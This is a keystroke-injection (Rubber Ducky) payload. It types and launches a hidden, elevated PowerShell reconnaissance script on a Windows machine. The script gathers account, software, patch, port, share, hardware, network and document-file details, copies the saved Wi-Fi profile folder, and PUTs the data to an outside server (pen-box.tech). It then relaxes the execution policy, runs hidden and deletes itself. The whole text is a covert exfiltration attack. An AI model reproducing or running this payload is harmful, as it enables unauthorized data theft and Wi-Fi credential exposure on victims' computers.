DELAY 7500
GUI r
DELAY 1000
STRING powershell Start-Process notepad -Verb runAs
ENTER
DELAY 750
ALT y
DELAY 750
ENTER
ALT SPACE
DELAY 1000
STRING m
DELAY 1000
DOWNARROW
REPEAT 100
ENTER
STRING # first get ready to push to Json
ENTER
STRING # business and machine ids for testing comps
ENTER
STRING $business_id = 1000;
ENTER
STRING $machine_id = 1000;
ENTER
STRING # token variable needed to access API
ENTER
STRING $token = ''
ENTER
STRING $folderDateTime = (get-date).ToString('d-M-y HHmmss')
ENTER
STRING $userDir = (Get-ChildItem env:\userprofile).value + '\Ducky Report ' + $folderDateTime
ENTER
STRING $fileSaveDir = New-Item  ($userDir) -ItemType Directory
ENTER
STRING $date = get-date
ENTER
STRING $style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"
ENTER
STRING $Report = ConvertTo-Html -Title 'Recon Report' -Head $style > $fileSaveDir'/ComputerInfo.html'
ENTER
STRING $Report = $Report + "<div id=body><h1>Ducky Recon Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>"
ENTER
STRING #user info
ENTER
STRING $url = 'https://pen-box.tech/user_information/create.php? Token='+$token;
ENTER
STRING $UserInfo = Get-WmiObject -class Win32_UserAccount -namespace root/CIMV2 | Where-Object {$_.Name -eq $env:UserName}| Select AccountType,SID,PasswordRequired
ENTER
STRING $UserType = $UserInfo.AccountType
ENTER
STRING $UserSid = $UserInfo.SID
ENTER
STRING $UserPass = $UserInfo.PasswordRequired
ENTER
STRING $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
ENTER
STRING If ($UserInfo.PasswordRequired -eq $false) {$UserPassReq = 0}
ENTER
STRING Else {$UserPassReq = 1}
ENTER
STRING If ($IsAdmin -eq $false) {$IsAdminB = 0}
ENTER
STRING Else {$IsAdminB = 1}
ENTER
STRING $UserPayload = @{
ENTER
STRING business_id = $business_id;
ENTER
STRING machine_id = $machine_id;
ENTER
STRING name = $env:USERNAME;
ENTER	
STRING type = $UserType;
ENTER	
STRING sid = $UserSid;
ENTER
STRING domain = $env:USERDOMAIN;
ENTER
STRING password = $UserPassReq;
ENTER	
STRING admin = $IsAdminB;
ENTER
STRING };
ENTER
STRING $the_json = $UserPayload | ConvertTo-Json;
ENTER
STRING Invoke-RestMethod -Method PUT -Uri $url -Body $the_json;
ENTER
STRING # Machines payload
ENTER
STRING $url = 'https://pen-box.tech/machines/create.php? Token='+$token;
ENTER
STRING $payloadMachines = @{
ENTER
STRING business_id = $business_id;
ENTER
STRING machine_id = $machine_id;
ENTER
STRING machine_name = $env:USERDOMAIN;
ENTER
STRING };
ENTER
STRING $the_json = $payloadMachines | ConvertTo-Json;
ENTER
STRING Invoke-RestMethod -Method PUT -Uri $url -Body $the_json;
ENTER
STRING $Report =  $Report + "<div id=left><h3>User Information</h3><br><table><tr><td>Current User Name:</td><td>$env:USERNAME</td></tr><tr><td>Account Type:</td><td> $UserType</td></tr><tr><td>User SID:</td><td>$UserSid</td></tr><tr><td>Account Domain:</td><td>$env:USERDOMAIN</td></tr><tr><td>Password Required:</td><td>$UserPass</td></tr><tr><td>Current User is Admin:</td><td>$IsAdmin</td></tr></table>"
ENTER
STRING $Report = $Report + '</div>'
ENTER
STRING # installed programs 
ENTER
STRING $url = 'https://pen-box.tech/installed_programs/create.php? Token='+$token;
ENTER
STRING $i = 0
ENTER
STRING $payloadInfo = Get-WmiObject -class Win32_Product | Select Name,Version,InstallDate
ENTER
STRING do {
ENTER
STRING $payloadPrograms = @{
ENTER
STRING business_id = $business_id;
ENTER
STRING machine_id = $machine_id;
ENTER
STRING name = $payloadInfo[$i].Name;
ENTER
STRING version = $payloadInfo[$i].Version;
ENTER
STRING install_date = $payloadInfo[$i].InstallDate;
ENTER
STRING };
ENTER
STRING $the_json = $payloadPrograms | ConvertTo-Json;
ENTER
STRING Invoke-RestMethod -Method PUT -Uri $url -Body $the_json;
ENTER
STRING $i ++
ENTER
STRING }while ($i -lt $payloadName.Count)
ENTER	
STRING $Report =  $Report + '<div id=center><h3> Installed Programs</h3> '
ENTER
STRING $Report =  $Report + (Get-WmiObject -class Win32_Product | ConvertTo-html  Name, Version,InstallDate)
ENTER
STRING $Report = $Report + '</table></div>'
ENTER
STRING $u = 0
ENTER
STRING #usb
ENTER
STRING $url = 'https://pen-box.tech/usb_devices/create.php? Token='+$token;
ENTER
STRING $allUsb = @(get-wmiobject win32_volume | select Name, Label, FreeSpace)
ENTER
STRING $Report =  $Report + '<div id=right><h3>USB Devices</h3><table>'
ENTER
STRING # more usb in loop
ENTER
STRING do {
ENTER
STRING $gbUSB = [math]::truncate($allUsb[$u].FreeSpace / 1GB)
ENTER
STRING $Report = $Report + "<tr><td>Drive Name: </td><td> " + $allUsb[$u].Name + $allUsb[$u].Label + "</td><td>Free Space: </td><td>" + $gbUSB + "GB</td></tr>"
ENTER
STRING $payloadUSB = @{
ENTER
STRING business_id = $business_id;
ENTER
STRING machine_id = $machine_id;
ENTER
STRING drive_name = $allUsb[$u].Name + $allUsb[$u].Label;
ENTER
STRING free_space = $gbUSB;
ENTER
STRING };
ENTER
STRING $the_json = $payloadUSB | ConvertTo-Json;
ENTER
STRING Invoke-RestMethod -Method PUT -Uri $url -Body $the_json;
ENTER
STRING Write-Output $fullUSB
ENTER
STRING $u ++
ENTER
STRING } while ($u -lt $allUsb.Count)
ENTER
STRING #updates
ENTER
STRING $url = 'https://pen-box.tech/installed_updates/create.php? Token='+$token;
ENTER
STRING $payloadInfo = Get-WmiObject Win32_QuickFixEngineering -ComputerName $env:COMPUTERNAME | sort-object -property installedon -Descending | Select  Description, HotFixId,Installedon,InstalledBy
ENTER
STRING $i = 0
ENTER
STRING do {
ENTER
STRING $payloadUpdates = @{
ENTER
STRING business_id = $business_id;
ENTER
STRING machine_id = $machine_id;
ENTER
STRING description = $payloadInfo[$i].Description;
ENTER
STRING hf_id = $payloadinfo[$i].HotFixId;
ENTER
STRING installed_on = [string]$payloadInfo[$i].Installedon;
ENTER
STRING installed_by = $payloadInfo[$i].InstalledBy;
ENTER
STRING };
ENTER
STRING #$payloadInfo[$i].InstalledBy;
ENTER
STRING $the_json = $payloadUpdates | ConvertTo-Json;
ENTER
STRING Invoke-RestMethod -Method PUT -Uri $url -Body $the_json;
ENTER
STRING $i ++
ENTER
STRING }while ($i -lt $payloadInfo.Count)
ENTER
STRING $Report = $Report + '</table></div>'
ENTER
STRING $Report =  $Report + '<div id=center><h3> Installed Updates</h3>'
ENTER
STRING $Report =  $Report +  (Get-WmiObject Win32_QuickFixEngineering -ComputerName $env:COMPUTERNAME | sort-object -property installedon -Descending | ConvertTo-Html   Description, HotFixId,Installedon,InstalledBy)
ENTER
STRING $Report = $Report + '</div>'
ENTER
STRING # Port Review
ENTER
STRING $url = 'https://pen-box.tech/port_scan/create.php? Token='+$token;
ENTER
STRING $Computer = $env:COMPUTERNAME
ENTER
STRING $PortList = 0, 21, 22, 23, 25, 79, 80, 110, 113, 119, 135, 137, 139, 143, 389, 443, 445, 1002, 1024, 1030, 1720, 1900, 5000, 8080
ENTER
STRING $Report = $Report  + '<div id=right><h3>Port Scan of ' + $Computer + '</h3><table>'
ENTER
STRING foreach ($PortNumber in $PortList) {
ENTER
STRING $PortCheck = New-Object Net.Sockets.TcpClient
ENTER
STRING $PortCheck.Connect($Computer, $PortNumber)
ENTER
STRING if ($PortCheck.Connected) {
ENTER
STRING $Report = $Report  +  '<tr><td><b><font color=red>Port ' + $PortNumber + ' is open</font></b></td></tr>'
ENTER
STRING $payloadPorts = @{
ENTER
STRING business_id = $business_id;
ENTER
STRING machine_id = $machine_id;
ENTER
STRING port_num = $PortNumber;
ENTER
STRING port_stat = 1;
ENTER
STRING };
ENTER
STRING $the_json = $payloadPorts | ConvertTo-Json;
ENTER
STRING Invoke-RestMethod -Method PUT -Uri $url -Body $the_json;
ENTER
STRING }
ENTER
STRING else {$Report = $Report  +  '<tr><td>Port ' + $PortNumber + ' is closed</td></tr>'
ENTER
STRING $payloadPorts = @{
ENTER
STRING business_id = $business_id;
ENTER
STRING machine_id = $machine_id;
ENTER
STRING port_num = $PortNumber;
ENTER
STRING port_stat = 0;
ENTER
STRING };
ENTER
STRING $the_json = $payloadPorts | ConvertTo-Json;
ENTER
STRING Invoke-RestMethod -Method PUT -Uri $url -Body $the_json;
ENTER
STRING }}
ENTER
STRING # Shared Devices
ENTER
STRING $url = 'https://pen-box.tech/shared_devices/create.php? Token='+$token;
ENTER
STRING $ShareDevices = GET-WMIOBJECT Win32_Share | select Name, Description, Path
ENTER
STRING ForEach($Device in $ShareDevices){
ENTER
STRING $payloadSharedDevices = @{
ENTER
STRING business_id = $business_id;
ENTER
STRING machine_id = $machine_id;
ENTER
STRING name = $Device.Name;
ENTER
STRING description = $Device.Description;
ENTER
STRING path = $Device.Path;
ENTER
STRING };
ENTER
STRING $the_json = $payloadSharedDevices | ConvertTo-Json;
ENTER
STRING Invoke-RestMethod -Method PUT -Uri $url -Body $the_json;
ENTER
STRING }
ENTER
STRING $Report = $Report + '</table></div>'
ENTER
STRING $Report =  $Report + '<div id=left><h3>Shared Drives/Devices</h3>'
ENTER
STRING $Report =  $Report + (GET-WMIOBJECT Win32_Share | convertto-html Name, Description, Path)
ENTER
STRING $Report = $Report + '</div>'
ENTER
STRING # Comp Information START
ENTER
STRING $SysBootTime = Get-WmiObject Win32_OperatingSystem
ENTER
STRING $BootTime = $SysBootTime.ConvertToDateTime($SysBootTime.LastBootUpTime)| ConvertTo-Html datetime
ENTER
STRING #Get actual uptime
ENTER
STRING $LastBoot = [System.Management.ManagementDateTimeconverter]::ToDateTime("$((gwmi  Win32_OperatingSystem).LastBootUpTime)")
ENTER
STRING $Uptime = (Get-Date) - $LastBoot
ENTER
STRING #system info
ENTER
STRING $SysSerialNo = (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME)
ENTER
STRING $SerialNo = $SysSerialNo.SerialNumber
ENTER
STRING $SysInfo = Get-WmiObject -class Win32_ComputerSystem -namespace root/CIMV2 | Select Manufacturer,Model
ENTER
STRING $SysManufacturer = $SysInfo.Manufacturer
ENTER
STRING $SysModel = $SysInfo.Model
ENTER
STRING #OS
ENTER
STRING $OS = (Get-WmiObject Win32_OperatingSystem -computername $env:COMPUTERNAME ).caption
ENTER
STRING # Disk Space
ENTER
STRING $disk = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'"
ENTER
STRING $HD = [math]::truncate($disk.Size / 1GB)
ENTER
STRING $FreeSpace = [math]::truncate($disk.FreeSpace / 1GB)
ENTER
STRING $SysRam = Get-WmiObject -Class Win32_OperatingSystem -computername $env:COMPUTERNAME | Select  TotalVisibleMemorySize
ENTER
STRING $Ram = [Math]::Round($SysRam.TotalVisibleMemorySize/1024KB)
ENTER
STRING #get Cpu type
ENTER
STRING $SysCpu = Get-WmiObject Win32_Processor | Select Name
ENTER
STRING $Cpu = $SysCpu.Name
ENTER
STRING # More comp info
ENTER
STRING $HardSerial = Get-WMIObject Win32_BIOS -Computer $env:COMPUTERNAME | select SerialNumber
ENTER
STRING $HardSerialNo = $HardSerial.SerialNumber
ENTER
STRING $SysCdDrive = Get-WmiObject Win32_CDROMDrive |select Name
ENTER
STRING $graphicsCard = gwmi win32_VideoController |select Name
ENTER
STRING $graphics = $graphicsCard.Name
ENTER
STRING $SysCdDrive = Get-WmiObject Win32_CDROMDrive |select -first 1
ENTER
STRING $DriveLetter = $SysCdDrive.Drive
ENTER
STRING $DriveName = $SysCdDrive.Caption
ENTER
STRING $Disk = $DriveLetter + '\' + $DriveName
ENTER
STRING #Firewall Info
ENTER
STRING $Firewall = New-Object -com HNetCfg.FwMgr
ENTER
STRING $FireProfile = $Firewall.LocalPolicy.CurrentProfile
ENTER
STRING $FireProfile = $FireProfile.FirewallEnabled
ENTER
STRING $Report = $Report  + "<div id=left><h3>Computer Information</h3><br><table><tr><td>Operating System</td><td>$OS</td></tr><tr><td>OS Serial Number:</td><td>$SerialNo</td></tr><tr><td>Current User:</td><td>$env:USERNAME </td></tr><tr><td>System Uptime:</td><td>$BootTime</td></tr><tr><td>System Manufacturer:</td><td>$SysManufacturer</td></tr><tr><td>System Model:</td><td>$SysModel</td></tr><tr><td>Serial Number:</td><td>$HardSerialNo</td></tr><tr><td>Firewall is Active:</td><td>$FireProfile</td></tr></table></div><div id=right><h3>Hardware Information</h3><table><tr><td>Hardrive Size:</td><td>$HD GB</td></tr><tr><td>Hardrive Free Space:</td><td>$FreeSpace GB</td></tr><tr><td>System RAM:</td><td>$Ram GB</td></tr><tr><td>Processor:</td><td>$Cpu</td></tr><td>CD Drive:</td><td>$Disk</td></tr><tr><td>Graphics Card:</td><td>$graphics</td></tr></table></div>"
ENTER
STRING $wlanSaveDir = New-Item $userDir'\Ducky\WLAN_PROFILES' -ItemType Directory
ENTER
STRING $srcDir = 'C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces'
ENTER
STRING Copy-Item $srcDir $wlanSaveDir -Recurse
ENTER
STRING $url = 'https://pen-box.tech/computer_information/create.php? Token='+$token;
ENTER
STRING $payloadCompInfo = @{
ENTER
STRING business_id = $business_id;
ENTER
STRING machine_id = $machine_id;
ENTER
STRING os = $OS;
ENTER
STRING os_sn = $HardSerialNo;
ENTER
STRING user = $env:USERNAME;
ENTER
STRING uptime = $Uptime.totalminutes;
ENTER
STRING manufacturer = $SysManufacturer;
ENTER
STRING model = $SysModel;
ENTER
STRING serial_number = $SerialNo;
ENTER
STRING firewall = $FireProfile;
ENTER
STRING drive_size = $disk.size;
ENTER
STRING drive_free_space = $FreeSpace;
ENTER
STRING ram = $Ram;
ENTER
STRING processor = $Cpu;
ENTER
STRING cd_drive = $Disk;
ENTER
STRING graphics = $graphics;
ENTER
STRING };
ENTER
STRING $the_json = $payloadCompInfo | ConvertTo-Json;
ENTER
STRING Invoke-RestMethod -Method PUT -Uri $url -Body $the_json;
ENTER
STRING # getting file names
ENTER
STRING # Getting stuck here we need to get types out as well as names, full path and, accessTimes
ENTER
STRING # should we loop for every file on the size of get-childitem?
ENTER
STRING # Yes we operate on each child in childitem return 
ENTER
STRING $url = 'https://pen-box.tech/user_documents/create.php? Token='+$token;
ENTER
STRING $ChildItems = Get-ChildItem -Path 'C:\Users' -Include *.docx, *.pdf, *.zip, *.xlsx -Recurse
ENTER
STRING ForEach ($Child in $ChildItems) {
ENTER
STRING $payloadFileNames = @{
ENTER
STRING business_id = $business_id;
ENTER
STRING machine_id = $machine_id;
ENTER
STRING name = $Child.Name;
ENTER
STRING type = $Child.Extension;
ENTER
STRING path = $Child.FullName;
ENTER
STRING last_access = $Child.LastAccessTime;
ENTER
STRING };
ENTER
STRING $the_json = $payloadFileNames | ConvertTo-Json;
ENTER
STRING Invoke-RestMethod -Method PUT -Uri $url -Body $the_json;
ENTER
STRING }	
ENTER
STRING $Report =  $Report + '<div id=center><h3>User Documents (doc,docx,pdf,rar)</h3>'
ENTER
STRING $Report =  $Report + (Get-ChildItem -Path 'C:\Users' -Include *.docx, *.pdf, *.zip, *.xlsx -Recurse |convertto-html File, Name, LastAccessTime)
ENTER
STRING $Report = $Report + '</div>'
ENTER
STRING # Network Information
ENTER
STRING $NetworkAdapter = Get-WmiObject Win32_NetworkAdapterConfiguration -filter 'IPEnabled= True'
ENTER
STRING $url = 'https://pen-box.tech/network_information/create.php? Token='+$token;
ENTER
STRING $payloadNetworkInfo = @{
ENTER
STRING business_id = $business_id;
ENTER
STRING machine_id = $machine_id;
ENTER
STRING description = $NetworkAdapter.Description;
ENTER
STRING dns = $NetworkAdapter.DNSHostName;
ENTER
STRING ip = [String]$NetworkAdapter.IPAddress;
ENTER
STRING mac = $NetworkAdapter.MACAddress;
ENTER
STRING }
ENTER
STRING $the_json = $payloadNetworkInfo | ConvertTo-Json;
ENTER
STRING Invoke-RestMethod -Method PUT -Uri $url -Body $the_json;
ENTER
STRING $Report =  $Report + '<div id=center><h3>Network Information</h3>'
ENTER
STRING $Report =  $Report + (Get-WmiObject Win32_NetworkAdapterConfiguration -filter 'IPEnabled= True' | Select Description,DNSHostname, @{Name='IP Address ';Expression={$_.IPAddress}}, MACAddress | ConvertTo-Html)
ENTER
STRING $Report = $Report + '</table></div>'
ENTER
STRING $Report >> $fileSaveDir'/ComputerInfo.html'
ENTER
STRING #getting all the files setup
ENTER
STRING function copy-ToZip($fileSaveDir){
ENTER
STRING $srcdir = $fileSaveDir
ENTER
STRING $zipFile = 'C:\Users\Public\Report.zip'
ENTER
STRING if(-not (test-path($zipFile))) {
ENTER
STRING set-content $zipFile ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))
ENTER
STRING (dir $zipFile).IsReadOnly = $false}
ENTER
STRING $shellApplication = new-object -com shell.application
ENTER
STRING $zipPackage = $shellApplication.NameSpace($zipFile)
ENTER
STRING $files = Get-ChildItem -Path $srcdir
ENTER
STRING foreach($file in $files) {
ENTER
STRING $zipPackage.CopyHere($file.FullName)
ENTER
STRING while($zipPackage.Items().Item($file.name) -eq $null){
ENTER
STRING Start-sleep -seconds 1 }}}
ENTER
STRING copy-ToZip($fileSaveDir)
ENTER
STRING remove-item $fileSaveDir -recurse
ENTER
STRING Remove-Item $MyINvocation.InvocationName
ENTER
CTRL s
DELAY 750    
STRING C:\Windows\config-56674.ps1
ENTER
DELAY 1000
ALT F4 
DELAY 750  
GUI r 
DELAY 500 
STRING powershell Start-Process cmd -Verb runAs 
ENTER
DELAY 1000
ALT y 
DELAY 750   
STRING mode con:cols=14 lines=1 
ENTER
ALT SPACE 
DELAY 750  
STRING m 
DELAY 1000
DOWNARROW 
REPEAT 100
ENTER
STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false 
ENTER 
DELAY 750  
STRING powershell.exe -windowstyle hidden -File C:\Windows\config-56674.ps1
REM STRING powershell.exe -File C:\Windows\config-56674.ps1
ENTER
GUI r 
DELAY 500 
STRING powershell Start-Process cmd -Verb runAs
DELAY 750
STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false 
ENTER 
DELAY 750  
STRING powershell.exe -windowstyle hidden -File C:\Windows\config-56674.ps1
ENTER